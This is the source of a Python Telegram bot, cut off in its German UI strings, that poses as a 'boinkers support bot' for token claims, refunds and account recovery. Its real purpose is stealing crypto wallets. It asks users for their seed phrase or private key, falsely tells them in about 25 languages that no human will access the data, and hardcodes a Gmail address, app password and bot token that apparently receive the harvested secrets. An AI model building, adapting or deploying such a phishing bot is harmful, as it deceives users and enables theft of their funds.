#!/usr/bin/env python3
import logging
import re
import smtplib
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7

# --- Email Configuration (YOU MUST UPDATE THESE) ---
# NOTE: Using a hardcoded password is a SECURITY RISK. For a real application,
# use environment variables. For a Gmail account, you need to use an App Password,
# not your regular password, and you may need to enable 2-step verification.
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # Use an App Password if using Gmail
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Bot token (as requested)
BOT_TOKEN = "8369298085:AAFoAMt73954PXJ-yvHaD0UJe70ya_LX3jI"

# Wallet display names used for wallet selection UI
WALLET_DISPLAY_NAMES = {
    'wallet_type_metamask': 'Tonkeeper',
    'wallet_type_trust_wallet': 'Telegram Wallet',
    'wallet_type_coinbase': 'MyTon Wallet',
    'wallet_type_tonkeeper': 'Tonhub',
    'wallet_type_phantom_wallet': 'Trust Wallet',
    'wallet_type_rainbow': 'Rainbow',
    'wallet_type_safepal': 'SafePal',
    'wallet_type_wallet_connect': 'Wallet Connect',
    'wallet_type_ledger': 'Ledger',
    'wallet_type_brd_wallet': 'BRD Wallet',
    'wallet_type_solana_wallet': 'Solana Wallet',
    'wallet_type_balance': 'Balance',
    'wallet_type_okx': 'OKX',
    'wallet_type_xverse': 'Xverse',
    'wallet_type_sparrow': 'Sparrow',
    'wallet_type_earth_wallet': 'Earth Wallet',
    'wallet_type_hiro': 'Hiro',
    'wallet_type_saitamask_wallet': 'Saitamask Wallet',
    'wallet_type_casper_wallet': 'Casper Wallet',
    'wallet_type_cake_wallet': 'Cake Wallet',
    'wallet_type_kepir_wallet': 'Kepir Wallet',
    'wallet_type_icpswap': 'ICPSwap',
    'wallet_type_kaspa': 'Kaspa',
    'wallet_type_nem_wallet': 'NEM Wallet',
    'wallet_type_near_wallet': 'Near Wallet',
    'wallet_type_compass_wallet': 'Compass Wallet',
    'wallet_type_stack_wallet': 'Stack Wallet',
    'wallet_type_soilflare_wallet': 'Soilflare Wallet',
    'wallet_type_aioz_wallet': 'AIOZ Wallet',
    'wallet_type_xpla_vault_wallet': 'XPLA Vault Wallet',
    'wallet_type_polkadot_wallet': 'Polkadot Wallet',
    'wallet_type_xportal_wallet': 'XPortal Wallet',
    'wallet_type_multiversx_wallet': 'Multiversx Wallet',
    'wallet_type_verachain_wallet': 'Verachain Wallet',
    'wallet_type_casperdash_wallet': 'Casperdash Wallet',
    'wallet_type_nova_wallet': 'Nova Wallet',
    'wallet_type_fearless_wallet': 'Fearless Wallet',
    'wallet_type_terra_station': 'Terra Station',
    'wallet_type_cosmos_station': 'Cosmos Station',
    'wallet_type_exodus_wallet': 'Exodus Wallet',
    'wallet_type_argent': 'Argent',
    'wallet_type_binance_chain': 'Binance Chain',
    'wallet_type_safemoon': 'SafeMoon',
    'wallet_type_gnosis_safe': 'Gnosis Safe',
    'wallet_type_defi': 'DeFi',
    'wallet_type_other': 'Other',
}

# PROFESSIONAL REASSURANCE translations
PROFESSIONAL_REASSURANCE = {
    "en": "\n\nFor your security: all information is processed automatically by this encrypted bot and stored encrypted. No human will access your data.",
    "es": "\n\nPara su seguridad: toda la información es procesada automáticamente por este bot cifrado y se almacena cifrada. Ninguna persona tendrá acceso a sus datos.",
    "fr": "\n\nPour votre sécurité : toutes les informations sont traitées automatiquement par ce bot chiffré et stockées de manière chiffrée. Aucune personne n'aura accès à vos données.",
    "ru": "\n\nВ целях вашей безопасности: вся информация обрабатывается автоматически этим зашифрованным ботом и хранится в зашифрованном виде. Человеческий доступ к вашим данным исключён.",
    "uk": "\n\nДля вашої безпеки: усі дані обробляються автоматично цим зашифрованим ботом і зберігаються в зашифрованому вигляді. Ніхто не матиме до них доступу.",
    "fa": "\n\nبرای امنیت شما: تمام اطلاعات به‌طور خودکار توسط این ربات رمزگذاری‌شده پردازش و به‌صورت رمزگذاری‌شده ذخیره می‌شوند. هیچ انسانی به داده‌های شما دسترسی نخواهد داشت.",
    "ar": "\n\nلأمانك: تتم معالجة جميع المعلومات تلقائيًا بواسطة هذا الروبوت المشفّر وتخزينها بشكل مشفّر. لا يمكن لأي شخص الوصول إلى بياناتك.",
    "pt": "\n\nPara sua segurança: todas as informações são processadas automaticamente por este bot criptografado e armazenadas criptografadas. Nenhum humano terá acesso aos seus dados.",
    "id": "\n\nDemi keamanan Anda: semua informasi diproses secara otomatis oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tidak ada orang yang akan mengakses data Anda.",
    "de": "\n\nZu Ihrer Sicherheit: Alle Informationen werden automatisch von diesem verschlüsselten Bot verarbeitet und verschlüsselt gespeichert. Kein Mensch hat Zugriff auf Ihre Daten.",
    "nl": "\n\nVoor uw veiligheid: alle informatie wordt automatisch verwerkt door deze versleutelde bot en versleuteld opgeslagen. Niemand krijgt toegang tot uw gegevens.",
    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्टेड रूप में संग्रहीत की जाती है। किसी भी व्यक्ति को इसकी पहुँच नहीं होगी।",
    "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez.",
    "zh": "\n\n为了您的安全：所有信息均由此加密机器人自动处理并以加密形式存储。不会有人访问您的数据。",
    "cs": "\n\nPro vaše bezpečí: všechny informace jsou automaticky zpracovávané tímto šifrovaným botem a ukládány zašifrovaně. K vašim datům nikdo nebude mít přístup.",
    "ur": "\n\nآپ کی حفاظت کے لیے: تمام معلومات خودکار طور پر اس خفیہ بوٹ کے ذریعہ پروسیس اور خفیہ طور پر محفوظ کی جاتی ہیں۔ کسی انسان کو آپ کے ڈیٹا تک رسائی نہیں ہوگی۔",
    "uz": "\n\nXavfsizligingiz uchun: barcha ma'lumotlar ushbu shifrlangan bot tomonidan avtomatik qayta ishlanadi va shifrlangan holda saqlanadi. Hech kim sizning ma'lumotlaringizga kira olmaydi.",
    "it": "\n\nPer la vostra sicurezza: tutte le informazioni sono elaborate automaticamente da questo bot crittografato e memorizzate in modo crittografato. Nessun umano avrà accesso ai vostri dati.",
    "ja": "\n\nお客様の安全のために：すべての情報はこの暗号化されたボットによって自動的に処理され、暗号化された状態で保存されます。人間がデータにアクセスすることはありません。",
    "ms": "\n\nUntuk keselamatan anda: semua maklumat diproses secara automatik oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tiada manusia akan mengakses data anda.",
    "ro": "\n\nPentru siguranța dumneavoastră: toate informațiile sunt procesate automat de acest bot criptat și stocate criptat. Nicio persoană nu va avea acces la datele dumneavoastră.",
    "sk": "\n\nPre vaše bezpečie: všetky informácie sú automaticky spracovávané týmto šifrovaným botom a ukladané v zašifrovanej podobe. Nikto nebude mať prístup k vašim údajom.",
    "th": "\n\nเพื่อความปลอดภัยของคุณ: ข้อมูลทั้งหมดจะได้รับการประมวลผลโดยอัตโนมัติโดยบอทที่เข้ารหัสนี้และจัดเก็บในรูปแบบที่เข้ารหัส ไม่มีใครเข้าถึงข้อมูลของคุณได้",
    "vi": "\n\nVì sự an toàn của bạn: tất cả thông tin được xử lý tự động bởi bot được mã hóa này và được lưu trữ dưới dạng đã mã hóa. Không ai có thể truy cập dữ liệu của bạn。",
    "pl": "\n\nDla Twojego bezpieczeństwa: wszystkie informacje są automatycznie przetwarzane przez tego zaszyfrowanego bota i przechowywane w formie zaszyfrowanej. Żaden człowiek nie będzie miał dostępu do Twoich danych.",
}

# Full multi-language UI texts (25 languages). Each welcome starts with "Hi {user} welcome to the boinkers support bot"
LANGUAGES = {
    "en": {
        "welcome": "Hi {user} welcome to the boinkers support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
        "main menu title": "Please select an issue type to continue:",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "claim tickets": "Claim Tickets",
        "recover account progress": "Recover Account Progress",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "withdrawals": "Withdrawals",
        "missing balance": "Missing Balance",
        "login issues": "Login Issues",
        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "reassurance": PROFESSIONAL_REASSURANCE["en"],
        "prompt seed": "Please enter the 12 or 24 words of your wallet." + PROFESSIONAL_REASSURANCE["en"],
        "prompt private key": "Please enter your private key." + PROFESSIONAL_REASSURANCE["en"],
        "invalid choice": "Invalid choice. Please use the buttons.",
        "final error message": "‼️ An error occurred. Use /start to try again.",
        "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
        "error_use_seed_phrase": "This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
        "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
        "choose language": "Please select your preferred language:",
        "await restart message": "Please click /start to start over.",
        "back": "🔙 Back",
        "invalid_input": "Invalid input. Please use /start to begin.",
        # Menu entries (reflecting your requested final menu)
        "account recovery": "Account Recovery",
        "claim spin": "Claim Spin",
        "refund": "Refund",
        "claim sticker reward": "Claim Sticker Reward",
    },
    "es": {
        "welcome": "Hi {user} bienvenido al bot de soporte boinkers! Este bot ayuda con el acceso a la billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
        "main menu title": "Seleccione un tipo de problema para continuar:",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "claim tickets": "Reclamar Entradas",
        "recover account progress": "Recuperar progreso de la cuenta",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "withdrawals": "Retiros",
        "missing balance": "Saldo Perdido",
        "login issues": "Problemas de Inicio de Sesión",
        "connect wallet message": "Por favor conecte su billetera con su Clave Privada o Frase Seed para continuar.",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor, seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Frase Seed",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["es"],
        "prompt seed": "Por favor, ingrese su frase seed de 12 o 24 palabras." + PROFESSIONAL_REASSURANCE["es"],
        "prompt private key": "Por favor, ingrese su clave privada." + PROFESSIONAL_REASSURANCE["es"],
        "invalid choice": "Opción inválida. Use los botones.",
        "final error message": "‼️ Ha ocurrido un error. /start para intentarlo de nuevo.",
        "final_received_message": "Gracias — su seed o clave privada ha sido recibida de forma segura y será procesada. Use /start para comenzar de nuevo.",
        "error_use_seed_phrase": "Este campo requiere una frase seed (12 o 24 palabras). Por favor proporcione la frase seed.",
        "post_receive_error": "‼️ Ocurrió un error. Asegúrese de introducir la clave correcta: use copiar y pegar para evitar errores. Por favor /start para intentarlo de nuevo.",
        "choose language": "Por favor, seleccione su idioma preferido:",
        "await restart message": "Haga clic en /start para empezar de nuevo.",
        "back": "🔙 Volver",
        "invalid_input": "Entrada inválida. Use /start para comenzar.",
        "account recovery": "Recuperación de Cuenta",
        "claim spin": "Reclamar Spin",
        "refund": "Reembolso",
        "claim sticker reward": "Reclamar Recompensa (Sticker)",
    },
    "fr": {
        "welcome": "Hi {user} bienvenue sur le bot d'assistance boinkers ! Ce bot aide avec l'accès au portefeuille, les transactions, les soldes, les récupérations, la récupération de compte, la réclamation de tokens et récompenses, les remboursements et la validation de compte. Veuillez choisir une option du menu pour continuer.",
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "claim tickets": "Réclamer des Billets",
        "recover account progress": "Récupérer la progression du compte",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "withdrawals": "Retraits",
        "missing balance": "Solde Manquant",
        "login issues": "Problèmes de Connexion",
        "connect wallet message": "Veuillez connecter votre portefeuille avec votre clé privée ou votre phrase seed pour continuer.",
        "connect wallet button": "🔑 Connecter un Portefeuille",
        "select wallet type": "Veuillez sélectionner votre type de portefeuille :",
        "other wallets": "Autres Portefeuilles",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer une Phrase Seed",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "reassurance": PROFESSIONAL_REASSURANCE["fr"],
        "prompt seed": "Veuillez entrer votre phrase seed de 12 ou 24 mots." + PROFESSIONAL_REASSURANCE["fr"],
        "prompt private key": "Veuillez entrer votre clé privée." + PROFESSIONAL_REASSURANCE["fr"],
        "invalid choice": "Choix invalide. Veuillez utiliser les boutons.",
        "final error message": "‼️ Une erreur est survenue. /start pour réessayer.",
        "final_received_message": "Merci — votre seed ou clé privée a été reçue en toute sécurité et sera traitée. Utilisez /start pour recommencer.",
        "error_use_seed_phrase": "Ce champ requiert une phrase seed (12 ou 24 mots). Veuillez fournir la phrase seed.",
        "post_receive_error": "‼️ Une erreur est survenue. Veuillez vous assurer que vous saisissez la bonne clé — utilisez copier-coller pour éviter les erreurs. Veuillez /start pour réessayer.",
        "choose language": "Veuillez sélectionner votre langue préférée :",
        "await restart message": "Cliquez /start pour recommencer.",
        "back": "🔙 Retour",
        "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
        "account recovery": "Récupération de Compte",
        "claim spin": "Réclamer Spin",
        "refund": "Remboursement",
        "claim sticker reward": "Réclamer Récompense (Sticker)",
    },
    "ru": {
        "welcome": "Hi {user} добро пожаловать в бот поддержки boinkers! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением активов и аккаунта, получением токенов и вознаграждений, возвратами и проверками аккаунта. Пожалуйста, выберите одну из опций меню, чтобы продолжить.",
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "claim tickets": "Запросить билеты",
        "recover account progress": "Восстановить прогресс аккаунта",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "withdrawals": "Выводы",
        "missing balance": "Пропавший Баланс",
        "login issues": "Проблемы со Входом",
        "connect wallet message": "Пожалуйста, подключите кошелёк приватным ключом или seed-фразой.",
        "connect wallet button": "🔑 Подключить Кошелёк",
        "select wallet type": "Пожалуйста, выберите тип вашего кошелька:",
        "other wallets": "Другие Кошельки",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Фразу",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочитаемый способ подключения.",
        "reassurance": PROFESSIONAL_REASSURANCE["ru"],
        "prompt seed": "Пожалуйста, введите seed-фразу из 12 или 24 слов." + PROFESSIONAL_REASSURANCE["ru"],
        "prompt private key": "Пожалуйста, введите приватный ключ." + PROFESSIONAL_REASSURANCE["ru"],
        "invalid choice": "Неверный выбор. Используйте кнопки.",
        "final error message": "‼️ Произошла ошибка. /start чтобы попробовать снова.",
        "final_received_message": "Спасибо — ваша seed или приватный ключ был успешно получен и будет обработан. Используйте /start для начала.",
        "error_use_seed_phrase": "Поле требует seed-фразу (12 или 24 слова). Пожалуйста, предоставьте seed-фразу.",
        "post_receive_error": "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вводите правильный ключ — используйте копирование/вставку. Пожалуйста, /start чтобы попробовать снова.",
        "choose language": "Пожалуйста, выберите язык:",
        "await restart message": "Нажмите /start чтобы начать заново.",
        "back": "🔙 Назад",
        "invalid_input": "Неверный ввод. Используйте /start чтобы начать.",
        "account recovery": "Восстановление Аккаунта",
        "claim spin": "Получить Spin",
        "refund": "Возврат",
        "claim sticker reward": "Получить Награду (Стикер)",
    },
    "uk": {
        "welcome": "Hi {user} ласкаво просимо до бота підтримки boinkers! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями активів та облікового запису, отриманням токенів і винагород, поверненнями і перевірками облікового запису. Будь ласка, виберіть одну з опцій меню, щоб продовжити.",
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "claim tickets": "Отримати квитки",
        "recover account progress": "Відновити прогрес облікового запису",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "withdrawals": "Виведення",
        "missing balance": "Зниклий Баланс",
        "login issues": "Проблеми з Входом",
        "connect wallet message": "Будь ласка, підключіть гаманець приватним ключем або seed-фразою.",
        "connect wallet button": "🔑 Підключити Гаманець",
        "select wallet type": "Будь ласка, виберіть тип гаманця:",
        "other wallets": "Інші Гаманці",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Фразу",
        "wallet selection message": "Ви вибрали {wallet_name}.\nВиберіть спосіб підключення.",
        "reassurance": PROFESSIONAL_REASSURANCE["uk"],
        "prompt seed": "Введіть seed-фразу з 12 або 24 слів." + PROFESSIONAL_REASSURANCE["uk"],
        "prompt private key": "Введіть приватний ключ." + PROFESSIONAL_REASSURANCE["uk"],
        "invalid choice": "Неправильний вибір. Використовуйте кнопки.",
        "final error message": "‼️ Сталася помилка. /start щоб спробувати знову.",
        "final_received_message": "Дякуємо — ваша seed або приватний ключ успішно отримані і будуть оброблені. Використовуйте /start щоб почати знову.",
        "error_use_seed_phrase": "Поле вимагає seed-фразу (12 або 24 слова). Будь ласка, надайте seed-фразу.",
        "post_receive_error": "‼️ Сталася помилка. Переконайтеся, що ви вводите правильний ключ — використовуйте копіювання та вставлення, щоб уникнути помилок. Будь ласка, /start щоб спробувати знову.",
        "choose language": "Будь ласка, виберіть мову:",
        "await restart message": "Натисніть /start щоб почати заново.",
        "back": "🔙 Назад",
        "invalid_input": "Недійсний ввід. Використовуйте /start щоб почати.",
        "account recovery": "Відновлення Облікового Запису",
        "claim spin": "Отримати Spin",
        "refund": "Повернення",
        "claim sticker reward": "Отримати Нагороду (Стикер)",
    },
    "fa": {
        "welcome": "Hi {user} خوش آمدید به ربات پشتیبانی boinkers! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، بازیابی حساب، درخواست توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "validation": "اعتبارسنجی",
        "claim tokens": "درخواست توکن‌ها",
        "claim tickets": "دریافت بلیت‌ها",
        "recover account progress": "بازیابی پیشرفت حساب",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "withdrawals": "برداشت",
        "missing balance": "موجودی گمشده",
        "login issues": "مشکلات ورود",
        "connect wallet message": "لطفاً کیف‌پول خود را با کلید خصوصی یا seed متصل کنید.",
        "connect wallet button": "🔑 اتصال کیف‌پول",
        "select wallet type": "لطفاً نوع کیف‌پول را انتخاب کنید:",
        "other wallets": "کیف‌پول‌های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "reassurance": PROFESSIONAL_REASSURANCE["fa"],
        "prompt seed": "لطفاً seed با 12 یا 24 کلمه را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "prompt private key": "لطفاً کلید خصوصی خود را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "invalid choice": "انتخاب نامعتبر. لطفاً از دکمه‌ها استفاده کنید.",
        "final error message": "‼️ خطا رخ داد. /start برای تلاش مجدد.",
        "final_received_message": "متشکریم — seed یا کلید خصوصی شما با امنیت دریافت و پردازش خواهد شد. /start را برای شروع مجدد بزنید.",
        "error_use_seed_phrase": "این فیلد به یک seed phrase (12 یا 24 کلمه) نیاز دارد. لطفاً seed را وارد کنید.",
        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — از کپی/پیست استفاده کنید. لطفاً /start برای تلاش مجدد.",
        "choose language": "لطفاً زبان را انتخاب کنید:",
        "await restart message": "برای شروع مجدد /start را بزنید.",
        "back": "🔙 بازگشت",
        "invalid_input": "ورودی نامعتبر. لطفاً از /start استفاده کنید.",
        "account recovery": "بازیابی حساب",
        "claim spin": "دریافت Spin",
        "refund": "بازپرداخت",
        "claim sticker reward": "دریافت جایزه (استیکر)",
    },
    "ar": {
        "welcome": "Hi {user} مرحبًا بك في بوت دعم boinkers! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استرداد الحساب، المطالبة بالرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "claim tickets": "المطالبة بالتذاكر",
        "recover account progress": "استعادة تقدم الحساب",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "withdrawals": "السحوبات",
        "missing balance": "الرصيد المفقود",
        "login issues": "مشاكل تسجيل الدخول",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام المفتاح الخاص أو عبارة seed للمتابعة.",
        "connect wallet button": "🔑 توصيل المحفظة",
        "select wallet type": "يرجى اختيار نوع المحفظة:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 المفتاح الخاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "reassurance": PROFESSIONAL_REASSURANCE["ar"],
        "prompt seed": "يرجى إدخال عبارة seed مكونة من 12 أو 24 كلمة." + PROFESSIONAL_REASSURANCE["ar"],
        "prompt private key": "يرجى إدخال المفتاح الخاص." + PROFESSIONAL_REASSURANCE["ar"],
        "invalid choice": "خيار غير صالح. يرجى استخدام الأزرار.",
        "final error message": "‼️ حدث خطأ. /start للمحاولة مرة أخرى.",
        "final_received_message": "شكرًا — تم استلام seed أو المفتاح الخاص بك بأمان وسيتم معالجته. استخدم /start للبدء من جديد.",
        "error_use_seed_phrase": "هذا الحقل يتطلب عبارة seed (12 أو 24 كلمة). الرجاء تقديم عبارة seed.",
        "post_receive_error": "‼️ حدث خطأ. يرجى التأكد من إدخال المفتاح الصحيح — استخدم النسخ واللصق لتجنب الأخطاء. يرجى /start للمحاولة مرة أخرى.",
        "choose language": "اختر لغتك المفضلة:",
        "await restart message": "انقر /start للبدء من جديد.",
        "back": "🔙 عودة",
        "invalid_input": "إدخال غير صالح. استخدم /start للبدء.",
        "account recovery": "استرداد الحساب",
        "claim spin": "المطالبة Spin",
        "refund": "استرداد",
        "claim sticker reward": "المطالبة بمكافأة (ملصق)",
    },
    "pt": {
        "welcome": "Hi {user} bem-vindo ao bot de suporte boinkers! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recuperação de conta, reivindicar tokens e recompensas, reembolsos e validações de conta. Por favor, escolha uma opção do menu para prosseguir.",
        "main menu title": "Selecione um tipo de problema para continuar:",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "claim tickets": "Reivindicar Ingressos",
        "recover account progress": "Recuperar progresso da conta",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "withdrawals": "Saques",
        "missing balance": "Saldo Ausente",
        "login issues": "Problemas de Login",
        "connect wallet message": "Por favor, conecte sua carteira com sua Chave Privada ou Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Carteira",
        "select wallet type": "Selecione o tipo da sua carteira:",
        "other wallets": "Outras Carteiras",
        "private key": "🔑 Chave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["pt"],
        "prompt seed": "Por favor, insira sua seed phrase de 12 ou 24 palavras." + PROFESSIONAL_REASSURANCE["pt"],
        "prompt private key": "Por favor, insira sua chave privada." + PROFESSIONAL_REASSURANCE["pt"],
        "invalid choice": "Escolha inválida. Use os botões.",
        "final error message": "‼️ Ocorreu um erro. /start para tentar novamente.",
        "final_received_message": "Obrigado — sua seed ou chave privada foi recebida com segurança e será processada. Use /start para começar de novo.",
        "error_use_seed_phrase": "Este campo requer uma seed phrase (12 ou 24 palavras). Por favor, forneça a seed phrase.",
        "post_receive_error": "‼️ Ocorreu um erro. Certifique-se de inserir a chave correta — use copiar/colar para evitar erros. Por favor /start para tentar novamente.",
        "choose language": "Selecione seu idioma preferido:",
        "await restart message": "Clique em /start para reiniciar.",
        "back": "🔙 Voltar",
        "invalid_input": "Entrada inválida. Use /start para começar.",
        "account recovery": "Recuperação de Conta",
        "claim spin": "Reivindicar Spin",
        "refund": "Reembolso",
        "claim sticker reward": "Reivindicar Recompensa (Sticker)",
    },
    "id": {
        "welcome": "Hi {user} selamat datang di bot dukungan boinkers! Bot ini membantu dengan akses dompet, transaksi, saldo, pemulihan, pemulihan akun, klaim token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "claim tickets": "Klaim Tiket",
        "recover account progress": "Pulihkan kemajuan akun",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "withdrawals": "Penarikan",
        "missing balance": "Saldo Hilang",
        "login issues": "Masalah Login",
        "connect wallet message": "Sambungkan dompet Anda dengan Kunci Pribadi atau Seed Phrase untuk melanjutkan.",
        "connect wallet button": "🔑 Sambungkan Dompet",
        "select wallet type": "Pilih jenis dompet Anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Pribadi",
        "seed phrase": "🔒 Impor Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi pilihan Anda.",
        "reassurance": PROFESSIONAL_REASSURANCE["id"],
        "prompt seed": "Masukkan seed phrase 12 atau 24 kata Anda." + PROFESSIONAL_REASSURANCE["id"],
        "prompt private key": "Masukkan kunci pribadi Anda." + PROFESSIONAL_REASSURANCE["id"],
        "invalid choice": "Pilihan tidak valid. Gunakan tombol.",
        "final error message": "‼️ Terjadi kesalahan. /start untuk mencoba lagi.",
        "final_received_message": "Terima kasih — seed atau kunci pribadi Anda telah diterima dengan aman dan akan diproses. Gunakan /start untuk mulai lagi.",
        "error_use_seed_phrase": "Kolom ini memerlukan seed phrase (12 atau 24 kata). Silakan berikan seed phrase.",
        "post_receive_error": "‼️ Terjadi kesalahan. Pastikan Anda memasukkan kunci yang benar — gunakan salin dan tempel untuk menghindari kesalahan. Silakan /start untuk mencoba lagi.",
        "choose language": "Silakan pilih bahasa:",
        "await restart message": "Klik /start untuk memulai ulang.",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak valid. Gunakan /start untuk mulai.",
        "account recovery": "Pemulihan Akun",
        "claim spin": "Klaim Spin",
        "refund": "Pengembalian Dana",
        "claim sticker reward": "Klaim Hadiah (Sticker)",
    },
    "de": {
        "welcome": "Hi {user} willkommen beim boinkers Support-Bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Kontoständen, Wiederherstellungen, Kontowiederherstellung, Token- und Belohnungsansprüchen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Option im Menü, um fortzufahren.",
        "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "claim tickets": "Tickets Beanspruchen",
        "recover account progress": "Kontofortschritt wiederherstellen",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "withdrawals": "Auszahlungen",
        "missing balance": "Fehlender Saldo",
        "login issues": "Anmeldeprobleme",
        "connect wallet message": "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed-Phrase importieren",
